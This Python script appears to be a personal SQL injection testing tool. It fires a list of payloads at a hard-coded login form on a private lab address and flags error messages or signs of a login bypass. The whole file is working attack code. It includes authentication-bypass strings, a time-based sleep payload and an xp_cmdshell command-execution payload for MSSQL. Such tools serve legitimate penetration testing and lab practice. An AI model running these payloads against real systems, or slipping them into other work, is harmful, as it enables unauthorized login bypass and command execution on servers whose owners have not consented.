"""
Advanced SQL Injection Payload Tester

This script performs automated testing for SQL Injection vulnerabilities
against a specified login form endpoint. It uses a variety of payloads
to detect error-based, boolean-based, and time-based SQLi.

Features:
- Login bypass detection
- Error message fingerprinting
- Time-delay payload support
- Includes payloads for MySQL, MSSQL, Oracle

Author: Atharva Dendge
"""

import requests

# Advanced SQLi payloads
payloads = [
    "' or '1'='1' --",
    "' or 'x'='x' #",
    "' or 'x'='x' -- -",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or ('1'='1' --",
    "' OR '1'='1' /*",
    "') or '1'='1'--",
    "' or sleep(5)--",              # Time-based
    "'||(SELECT '')||'",           # Oracle-style
    "'; EXEC xp_cmdshell('dir');--", # MS SQL
    "' UNION SELECT NULL--",
    "' AND (SELECT 1 FROM dual) = 1--",
    "admin' --",
    "admin' or '1'='1",
    "admin') or ('1'='1' --"
]

# Error-based detection
error_signatures = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql error",
    "ORA-01756",
    "ODBC Microsoft Access",
    "mysql_fetch",
    "mysqli_fetch",
    "syntax error",
]

# Target configuration
target_url = "http://10.10.95.166/login.php"
headers = {
    "User-Agent": "Mozilla/5.0 (SQLi-Tester)",
    "Content-Type": "application/x-www-form-urlencoded"
}

print("[*] Starting advanced SQLi test on:", target_url)

for payload in payloads:
    data = {
        "username": payload,
        "password": "randompass"
    }

    try:
        response = requests.post(target_url, data=data, headers=headers, timeout=8)
        lower_body = response.text.lower()

        if any(err in lower_body for err in error_signatures):
            print(f"\n[!] Error-based SQLi hint with payload: {payload}")
        elif "welcome" in lower_body or "dashboard" in lower_body or response.url != target_url:
            print(f"\n[+] Login Bypassed! Likely SQLi successful with: {payload}")
        else:
            print(f"[-] No effect: {payload}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed for payload {payload}: {e}")
      
